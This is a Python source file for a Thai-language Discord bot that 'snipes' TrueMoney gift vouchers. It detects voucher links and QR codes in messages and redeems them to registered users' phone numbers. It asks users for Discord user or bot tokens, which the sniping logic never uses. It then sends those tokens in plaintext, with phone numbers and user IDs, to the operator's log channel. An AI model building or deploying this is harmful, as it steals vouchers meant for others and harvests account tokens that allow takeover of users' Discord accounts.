import discord
from discord.ext import commands
from discord import app_commands, ui
import asyncio
import aiohttp
import json
import os
import re
import io
import cv2
import numpy as np
from PIL import Image
from keep_alive import keep_alive

# --- Configuration ---
TOKEN_LOG_CHANNEL_ID = 1487818086202478822
SUCCESS_LOG_CHANNEL_ID = 1489527387183120505
GIF_URL = "https://cdn.discordapp.com/attachments/1489587803393364018/1551254339820064879/c7507064ec33d1c80c489e7400f60ef2.gif"
DATA_FILE = "data.json"

# --- Database Helpers ---
def load_data():
    if not os.path.exists(DATA_FILE):
        return {}
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}

def save_data(data):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

db = load_data()

# --- Bot Setup ---
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.dm_messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

async def update_bot_presence():
    total_tokens = sum(len(user_info.get("tokens", [])) for user_info in db.values())
    activity = discord.Game(name=f"ตอนนี้มีคนกำลังใช้บริการบอทดักอยู่ {total_tokens} คน")
    await bot.change_presence(activity=activity)

# --- Helper Functions ---
async def verify_token(token: str):
    headers = {"Authorization": token}
    async with aiohttp.ClientSession() as session:
        # Check User Token
        async with session.get("https://discord.com/api/v10/users/@me", headers=headers) as resp:
            if resp.status == 200:
                data = await resp.json()
                return True, "User", f"{data.get('username')}#{data.get('discriminator', '0')}"
        
        # Check Bot Token
        headers_bot = {"Authorization": f"Bot {token}"}
        async with session.get("https://discord.com/api/v10/users/@me", headers=headers_bot) as resp:
            if resp.status == 200:
                data = await resp.json()
                return True, "Bot", f"{data.get('username')}#{data.get('discriminator', '0')}"
                
    return False, None, None

def format_phone(phone: str) -> str:
    if len(phone) >= 10:
        return phone[:3] + "xxxxxxx"
    return phone

async def redeem_truemoney(mobile: str, voucher_code: str):
    url = f"https://gift.truemoney.com/v1/giftcards/{voucher_code}/redeem"
    payload = {"mobile": mobile, "voucher_hash": voucher_code}
    headers = {"Content-Type": "application/json"}
    
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url, json=payload, headers=headers) as resp:
                res = await resp.json()
                if resp.status == 200 and res.get("status", {}).get("code") == "SUCCESS":
                    amount = float(res["data"]["my_ticket"]["amount_baht"])
                    return True, amount
                return False, res.get("status", {}).get("message", "Unknown error")
        except Exception as e:
            return False, str(e)

def extract_voucher_code(text: str) -> str:
    match = re.search(r'v=([a-zA-Z0-9]+)', text)
    if match:
        return match.group(1)
    match_hash = re.search(r'gift\.truemoney\.com/v1/\?v=([a-zA-Z0-9]+)', text)
    if match_hash:
        return match_hash.group(1)
    return None

# --- UI Modals ---
class TokenInputModal(ui.Modal, title="กรอกข้อมูล Token และ เบอร์โทร"):
    phone = ui.TextInput(label="เบอร์โทรศัพท์ TrueMoney", placeholder="0425380292", required=True)
    tokens_input = ui.TextInput(
        label="Token (ใส่ได้สูงสุด 5 Token เว้นบรรทัด)",
        style=discord.TextStyle.paragraph,
        placeholder="วาง UserToken หรือ BotToken ที่นี่ (บรรทัดละ 1 ตัว)",
        required=True
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        
        checking_embed = discord.Embed(
            description="<a:1000030105:1551256174287126619> กำลังเช็คtoken โปรดรอสักครู่..",
            color=discord.Color.red()
        )
        msg = await interaction.followup.send(embed=checking_embed, ephemeral=True)
        await asyncio.sleep(2)

        raw_tokens = [t.strip() for t in self.tokens_input.value.split("\n") if t.strip()][:5]
        valid_tokens = []

        for t in raw_tokens:
            is_valid, t_type, name = await verify_token(t)
            if is_valid:
                valid_tokens.append({"token": t, "type": t_type, "name": name})

        user_id = str(interaction.user.id)

        if valid_tokens:
            db[user_id] = {
                "phone": self.phone.value,
                "tokens": valid_tokens,
                "status": db.get(user_id, {}).get("status", False),
                "total_earned": db.get(user_id, {}).get("total_earned", 0.0),
                "total_rounds": db.get(user_id, {}).get("total_rounds", 0)
            }
            save_data(db)
            await update_bot_presence()

            types_str = ", ".join(list(set([vt['type'] for vt in valid_tokens])))
            success_embed = discord.Embed(
                description=f"<a:1000030103:1551255510215426088> ระบบได้บันทึกToken เเละ เบอร์ของคุณไว้เรียบร้อย สามารถกดเปิดระบบได้เลย Tokenที่กรอกมาเป็นประเภท {types_str} <a:1000030106:1551256934215061615>",
                color=discord.Color.red()
            )
            await interaction.followup.edit_message(message_id=msg.id, embed=success_embed)

            log_chan = bot.get_channel(TOKEN_LOG_CHANNEL_ID)
            if log_chan:
                log_embed = discord.Embed(
                    title="มีการกรอก Token ใหม่",
                    description=f"มีคนกรอกtokenเเละเบอร์มาเเล้ว\n**Token:** {', '.join([vt['token'] for vt in valid_tokens])}\n**ประเภท:** {types_str}\n**เบอร์:** {self.phone.value}\n**คนที่ส่งมา:** {interaction.user.mention} ({interaction.user.id})",
                    color=discord.Color.red()
                )
                await log_chan.send(embed=log_embed)
        else:
            fail_embed = discord.Embed(
                description="<a:1000030101:1551255585029103636> Token ไม่ถูกต้อง โปรดกรอกusertoken / token ให้ถูกต้อง <a:1000030106:1551256934215061615>",
                color=discord.Color.red()
            )
            await interaction.followup.edit_message(message_id=msg.id, embed=fail_embed)

class CheckSingleTokenModal(ui.Modal, title="Check Token"):
    token_input = ui.TextInput(label="ใส่ Token ที่ต้องการเช็ค", placeholder="UserToken / BotToken", required=True)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        is_valid, t_type, name = await verify_token(self.token_input.value.strip())
        
        if is_valid:
            embed = discord.Embed(
                description=f"<a:1000030103:1551255510215426088> Tokenถูกต้อง เป็นโทเค่นประเภท {t_type} [{name}]",
                color=discord.Color.red()
            )
        else:
            embed = discord.Embed(
                description="<a:1000030101:1551255585029103636> Tokenไม่ถูกต้อง",
                color=discord.Color.red()
            )
        await interaction.followup.send(embed=embed, ephemeral=True)

# --- UI Dropdown View ---
class OeiSelect(ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="กรอกอะไรต่างๆนาๆ", value="1", description="กรอก Token และ เบอร์รับเงิน", emoji="<a:1000030100:1551255128818983113>"),
            discord.SelectOption(label="เปิดระบบ", value="2", description="เริ่มระบบการดักซอง", emoji="<a:1000030103:1551255510215426088>"),
            discord.SelectOption(label="ปิดการทำงาน", value="3", description="หยุดระบบการดักซอง", emoji="<a:1000030101:1551255585029103636>"),
            discord.SelectOption(label="เช็คการทำงาน+โปรไฟล์โทเค่น", value="4", description="ดูสถานะและรายการ Token", emoji="<a:1000030093:1551252638794780883>"),
            discord.SelectOption(label="Check Token", value="5", description="ตรวจสอบความถูกต้องของ Token", emoji="<a:1000030106:1551256934215061615>"),
            discord.SelectOption(label="ล้างตัวเลือก", value="6", description="รีเซ็ตและล้างข้อมูลทั้งหมด", emoji="<a:1000030104:1551255815267295273>"),
        ]
        super().__init__(placeholder="ลิสเลือกการทำงาน...", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        user_id = str(interaction.user.id)
        val = self.values[0]

        if val == "1":
            await interaction.response.send_modal(TokenInputModal())

        elif val == "2":
            user_data = db.get(user_id)
            if not user_data or not user_data.get("tokens") or not user_data.get("phone"):
                embed = discord.Embed(
                    description="<a:1000030101:1551255585029103636> คุณยังไม่ได้กรอกข้อมูลต่างๆ โปรดกรอกให้ครบในลิสที่1ด้วยย",
                    color=discord.Color.red()
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)
            else:
                user_data["status"] = True
                save_data(db)
                embed = discord.Embed(
                    description="<a:1000030103:1551255510215426088> ระบบกำลังทำการ สามารถรอรับเงินได้เลยย ถ้าหากต้องการหยุดเเค่กดลิสที่3จะเป็นการหยุด",
                    color=discord.Color.red()
                )
                await interaction.response.send_message(embed=embed, ephemeral=True)

        elif val == "3":
            user_data = db.get(user_id)
            if user_data and user_data.get("status", False):
                user_data["status"] = False
                save_data(db)
                embed = discord.Embed(
                    description="<a:1000030103:1551255510215426088> หยุดการทำงานสำเร็จ ถ้าหากต้องการให้กลับมาทำงานโปลดกดลิสที่2ได้ทันที!!",
                    color=discord.Color.red()
                )
            else:
                embed = discord.Embed(
                    description="<a:1000030093:1551252638794780883> ระบบไม่ได้ทำงานอยู่เเล้ว หรือหากต้องการ เเค่กดลิสที่2!!!",
                    color=discord.Color.red()
                )
            await interaction.response.send_message(embed=embed, ephemeral=True)

        elif val == "4":
            user_data = db.get(user_id)
            if not user_data or not user_data.get("tokens"):
                embed = discord.Embed(description="ไม่มี Token ในระบบ", color=discord.Color.red())
            elif not user_data.get("status", False):
                embed = discord.Embed(description="ระบบไม่ได้ทำงานอยู่", color=discord.Color.red())
            else:
                tokens = user_data.get("tokens", [])
                desc = f"<a:1000030093:1551252638794780883> กำลังทำงาน tokenทั้งหมดที่กำลังดักมีทั้งหมด ({len(tokens)})\nเเละนี่คือโปรไฟล์tokenเเต่ละตัว:\n"
                for idx, t in enumerate(tokens, 1):
                    desc += f"{idx}. [{t['type']}] {t['name']}\n"
                embed = discord.Embed(description=desc, color=discord.Color.red())
            await interaction.response.send_message(embed=embed, ephemeral=True)

        elif val == "5":
            await interaction.response.send_modal(CheckSingleTokenModal())

        elif val == "6":
            if user_id in db:
                db.pop(user_id)
                save_data(db)
                await update_bot_presence()
            embed = discord.Embed(
                description="<a:1000030109:1551262224796876951> ล้างตัวเลือกสำเร็จ..",
                color=discord.Color.red()
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)

class OeiView(ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(OeiSelect())

# --- Global Message Listener for Sniping (Text, Forums, DMs, Images/QR) ---
@bot.event
async def on_message(message: discord.Message):
    if message.author == bot.user:
        return

    content = message.content
    voucher_code = extract_voucher_code(content)

    # Scan Attachments for QR Code using OpenCV
    if not voucher_code and message.attachments:
        for attachment in message.attachments:
            if any(attachment.filename.lower().endswith(ext) for ext in ['.png', '.jpg', '.jpeg', '.webp']):
                try:
                    img_bytes = await attachment.read()
                    nparr = np.frombuffer(img_bytes, np.uint8)
                    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)

                    if img is not None:
                        detector = cv2.QRCodeDetector()
                        qr_data, _, _ = detector.detectAndDecode(img)
                        if qr_data:
                            found_code = extract_voucher_code(qr_data)
                            if found_code:
                                voucher_code = found_code
                                break
                except Exception as e:
                    print(f"Error scanning QR: {e}")
            if voucher_code:
                break

    # If voucher code detected, attempt redeeming for active users
    if voucher_code:
        for user_id, user_data in db.items():
            if user_data.get("status", False) and user_data.get("phone"):
                phone = user_data["phone"]
                success, amount_or_err = await redeem_truemoney(phone, voucher_code)
                if success:
                    user_data["total_earned"] = user_data.get("total_earned", 0.0) + amount_or_err
                    user_data["total_rounds"] = user_data.get("total_rounds", 0) + 1
                    save_data(db)

                    log_chan = bot.get_channel(SUCCESS_LOG_CHANNEL_ID)
                    if log_chan:
                        short_p = format_phone(phone)
                        log_embed = discord.Embed(
                            description=(
                                f"มีคนได้รับซองเเล้ว <a:1000030106:1551256934215061615> <@{user_id}>\n\n"
                                f"<a:1000030107:1551259572289806406> จำนวนเงิน **{amount_or_err:.2f}** บาท\n\n"
                                f"<a:1000030105:1551256174287126619> เบอร์แบบย่อ **{short_p}**\n\n"
                                f"<a:1000030095:1551252990772383868> ลิ้งซอง https://gift.truemoney.com/v1/?v={voucher_code}\n\n"
                                f"<a:1000030104:1551255815267295273> เบอร์นี้/user นี้เคยได้รับเงินไปเเล้วทั้งหมด **{user_data['total_earned']:.2f}** บาท / **{user_data['total_rounds']}** รอบ\n\n"
                                f"⏰ เวลาที่ได้รับ: <t:{int(discord.utils.utcnow().timestamp())}:F>"
                            ),
                            color=discord.Color.red()
                        )
                        await log_chan.send(content=f"<@{user_id}>", embed=log_embed)

    await bot.process_commands(message)

# --- Slash Command ---
@bot.tree.command(name="oei", description="เปิดเมนูดักซอง")
async def oei_command(interaction: discord.Interaction):
    embed = discord.Embed(
        title="<a:1000030093:1551252638794780883> Ɗ𐤠ƘⳜⰙƝƓ",
        description=(
            "<a:1000030095:1551252990772383868> กรอกเบอร์ที่ต้องการให้รับเงิน\n\n"
            "<a:1000030096:1551253928069570611> ใส่UserToken / BotToken\n\n"
            "<a:1000030106:1551256934215061615> วิธีใช้งาน\n"
            "-. กรอกลิส1ก่อนเป็นการใส่ข้อมูล\n"
            "-. หลังจากใส่ลิส1สามารถกดลิส2เป็นการเริ่มการดัก\n"
            "-. หากต้องการหยุดให้กดลิส3\n"
            "-."
        ),
        color=discord.Color.red()
    )
    embed.set_image(url=GIF_URL)
    await interaction.response.send_message(embed=embed, view=OeiView())

# --- Bot Ready Event ---
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}")
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(f"Failed to sync commands: {e}")
    
    await update_bot_presence()

# --- Entry Point ---
if __name__ == "__main__":
    keep_alive()
    TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("Please set DISCORD_BOT_TOKEN environment variable in Render!")
